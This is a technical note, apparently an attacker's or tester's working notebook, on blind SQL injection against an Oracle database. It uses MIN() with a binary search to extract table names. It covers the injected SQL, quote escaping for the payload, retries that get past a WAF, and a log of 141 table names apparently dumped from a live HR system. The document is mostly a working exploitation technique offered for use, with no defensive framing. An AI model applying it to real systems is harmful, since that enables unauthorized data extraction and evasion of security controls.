# MIN + Binary Search Extraction

## Concept
Instead of extracting one character at a time with linear search (up to 94 requests per char), use `MIN(column)` to find the lexicographically smallest value in a filtered set, then binary-search its characters.

## Algorithm
```
target = MIN(col) FROM table WHERE col > 'PREV'
For each character position:
    1. Binary search ASCII 33–126 to find smallest c where:
       EXISTS (row with col > 'PREV' AND col < 'PREV' + c)
       == FALSE
       (i.e., no row is strictly less than PREV+c, so MIN starts with PREV+c)
    2. Append c to prefix.
    3. Stop when MIN(col) <= prefix (we have the full minimum).
```

## Pagination
```sql
SELECT MIN(table_name) FROM user_tables
WHERE table_name > 'PREV' AND ROWNUM = 1
```
Use `ROWNUM=1` to keep the query cheap. Advance `PREV` to the last extracted name to get the next one.

## Quote Escaping in Practice
When `PREV` contains single quotes (rare for table names, common for data), double them:
```python
p = prev.replace("'", "''")
sql = f"table_name > ''{p}''"
```

## Deduplication
Oracle `ROWNUM` pagination can return the same name twice if the session's sort order is non-deterministic or if a duplicate write occurred. Maintain a `known` set and skip duplicates.

## WAF and Timeout Resilience
- Wrap each `dump_next()` call in `try/except Exception`.
- On timeout or connection error: sleep 60s, then retry the same `prev`.
- Exponential backoff on WAF: 15s, 30s, 60s, ...

## Example Session Log
```
resume from: 'EXAM_SUBJECT' have 55
56 FEEDBACK
57 GROUP_POSITION_HRMS
58 GW_CHECKSUM
...
138 TIMEKEEPING_DEVICE
no more tables after 'WORK_DAY'
Total tables: 141
```
